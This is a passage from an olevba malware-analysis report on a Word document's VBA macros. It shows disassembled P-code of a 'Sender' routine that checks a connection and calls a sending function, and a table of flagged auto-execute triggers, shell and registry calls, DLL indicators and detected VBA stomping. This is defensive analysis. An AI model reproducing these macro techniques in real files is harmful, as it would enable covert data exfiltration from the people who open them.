' 	StartForVariable 
' 	Next 
' Line #448:
' 	EndFunc 
' Line #449:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #450:
' 	FuncDefn (Sub Sender())
' Line #451:
' 	Dim 
' 	VarDefn i (As Long)
' Line #452:
' 	LitDI2 0x0000 
' 	St i 
' Line #453:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0004 
' 	For 
' Line #454:
' 	Ld Check_Connection 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #455:
' 	ArgsCall Sender_main 0x0000 
' Line #456:
' 	ExitSub 
' Line #457:
' 	ElseBlock 
' Line #458:
' 	LitDI2 0x00FE 
' 	ArgsCall Pause 0x0001 
' Line #459:
' 	EndIfBlock 
' Line #460:
' 	StartForVariable 
' 	Next 
' Line #461:
' 	EndSub 
' Line #462:
' Line #463:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegOpenKeyEx        |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |0.0.0.0             |IPv4 address                                 |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |kernel32.dll        |Executable file name                         |
|IOC       |user32.dll          |Executable file name                         |
|IOC       |RasApi32.DLL        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

